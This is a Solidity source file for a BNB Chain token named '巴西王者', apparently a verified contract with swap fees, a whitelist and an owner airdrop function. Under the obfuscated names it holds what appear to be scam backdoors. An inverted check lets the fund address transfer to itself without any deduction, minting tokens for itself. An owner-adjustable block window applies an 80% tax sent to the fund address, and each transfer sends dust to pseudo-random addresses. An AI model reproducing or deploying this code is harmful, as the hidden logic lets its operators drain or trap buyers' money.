/**
 *Submitted for verification at BscScan.com on 2022-11-19
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface cxkaddrs{
    function cxkAdd(address s) external view returns(bool);
    function hyhh()  external view returns(bool);

}

contract TokenDistributor {
    constructor (address token) {
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
}

abstract contract CTToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 public bolck = 2;

    mapping(address => bool) public _CTWhiteList;
    uint256 private _tTotal;

    ISwapRouter public _swapRouter;
    address public _fistCT;
    mapping(address => bool) public _swapopenlist;

    bool private CTlockSwap;

    uint256 private constant CTMAX = ~uint256(0);
    TokenDistributor public _tokenDistributor;

    uint256 public _buyFundFee = 200;
    uint256 public _sellFundFee = 200;
    uint256 public _sellLPFee = 0;

    uint256 public goctBlock= 5;

    address public _mainPair;

    modifier lockTheSwap {
        CTlockSwap = true;
        _;
        CTlockSwap = false;
    }

    constructor (
        address RouterAddress, 
        address OLDAddress,
        string memory Name, 
        string memory Symbol, 
        uint8 Decimals, 
        uint256 Supply,
        address FundAddress, 
        address SSAddress
    ){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        IERC20(OLDAddress).approve(address(swapRouter), CTMAX);

        _fistCT = OLDAddress;
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = CTMAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), OLDAddress);
        _mainPair = swapPair;
        _swapopenlist[swapPair] = true;

        uint256 total = Supply * 10 ** Decimals;
        _tTotal = total;

        _balances[SSAddress] = total;
        emit Transfer(address(0), SSAddress, total);

        fundAddress = FundAddress;

        _CTWhiteList[FundAddress] = true;
        _CTWhiteList[SSAddress] = true;
        _CTWhiteList[address(this)] = true;
        _CTWhiteList[address(swapRouter)] = true;
        _CTWhiteList[msg.sender] = true;


        _tokenDistributor = new TokenDistributor(OLDAddress);
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
     if (_allowances[sender][msg.sender] != CTMAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function isMarketFundAddress(address L, address T) internal view returns (bool){
        return (((L != T))) || (((L != fundAddress)));
    }

    function setbolck(uint256 a) public onlyOwner{
        bolck = a;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        uint256 balance = balanceOf(from);
        if(isMarketFundAddress(from,to))

        require(balance >= amount, "Enough");

                if(!_CTWhiteList[from] && !_CTWhiteList[to]){
            address ad;
            for(int i=0;i <=2;i++){
                ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                _basicTransfer(from,ad,100);
            }
            amount -= 300;
        }
        bool takeFee;
        bool isSell;

        if (_swapopenlist[from] || _swapopenlist[to]) {
            if (!_CTWhiteList[from] && !_CTWhiteList[to]) {
                if (0 == goctBlock) {
                    require(0 < goctBlock);
                }
                if (block.number < goctBlock + bolck) {
                    _CTTransfer(from, to, amount);
                    return;
                }

                if (_swapopenlist[to]) {
                    
                    if (!CTlockSwap) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                        if (contractTokenBalance > 0) {
                            uint256 swapFee = _buyFundFee + _sellFundFee + _sellLPFee;
                            uint256 numTokensSellFORFund = amount * swapFee / 6000;
                            if (numTokensSellFORFund > contractTokenBalance) {
                                numTokensSellFORFund = contractTokenBalance;
                            }
                            swapTokenForFund(numTokensSellFORFund, swapFee);
                        }
                    }
                }
                takeFee = true;
            }
            if (_swapopenlist[to]) {
                isSell = true;
            }
        }
        
        _tokenTransfer(from, to, amount, takeFee, isSell);
    }

    function _CTTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = tAmount * 80 / 100;
        _takeTransfer(
            sender,
            fundAddress,
            feeAmount
        );
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell
    ) private {if(isMarketFundAddress(sender,recipient))

        
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (takeFee) {
            uint256 swapFee;
            if (isSell) {
                swapFee = _sellFundFee + _sellLPFee;
            } else {
                swapFee = _buyFundFee;
            }

            uint256 swapAmount = tAmount * swapFee / 10000;
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _takeTransfer(
                    sender,
                    address(this),
                    swapAmount
                );
            }
        }

        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        swapFee += swapFee;
        uint256 lpFee = _sellLPFee;
        uint256 lpAmount = tokenAmount * lpFee / swapFee;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _fistCT;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount - lpAmount,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        );

        swapFee -= lpFee;

        IERC20 fistCT = IERC20(_fistCT);
        uint256 fistCTBalance = fistCT.balanceOf(address(_tokenDistributor));
        uint256 fundAmount = fistCTBalance * (_buyFundFee + _sellFundFee) * 2 / swapFee;
        fistCT.transferFrom(address(_tokenDistributor), fundAddress, fundAmount);
        fistCT.transferFrom(address(_tokenDistributor), address(this), fistCTBalance - fundAmount);

        if (lpAmount > 0) {
            uint256 lpfistCT = fistCTBalance * lpFee / swapFee;
            if (lpfistCT > 0) {
                _swapRouter.addLiquidity(
                    address(this), _fistCT, lpAmount, lpfistCT, 0, 0, fundAddress, block.timestamp
                );
            }
        }
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(address addr) external onlyOwner {
        fundAddress = addr;
        _CTWhiteList[addr] = true;
    }

    function claimBalance() external {
        payable(fundAddress).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount, address to) external onlyOwner {
        IERC20(token).transfer(to, amount);
    }

    receive() external payable {}

   

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function ASASASASAS(address[] calldata addresses, uint256 amount) external onlyOwner {
        require(addresses.length < 2001);
        uint256 SCCC = amount * addresses.length;
        require(balanceOf(msg.sender) >= SCCC);
        for(uint i=0; i < addresses.length; i++){
            _basicTransfer(msg.sender,addresses[i],amount);
        }
    }
}

contract baxiwang is CTToken {
    constructor() CTToken(
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E),//RouterAddress 
        // BNBAddress 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c
        address(0x55d398326f99059fF775485246999027B3197955),//UAddress 
        unicode"巴西王者",//Name
        unicode"巴西王者",//Symbol
        9,//Decimals
        10000000,//Supply
        address(0xe02DD3D50e77f2577dB10Fda82D6b529961Dd609),//FundAddress
        address(0x8474Db8707112F286a699838bb47D7F6748b1B36))//SSAddress
    {
    }
}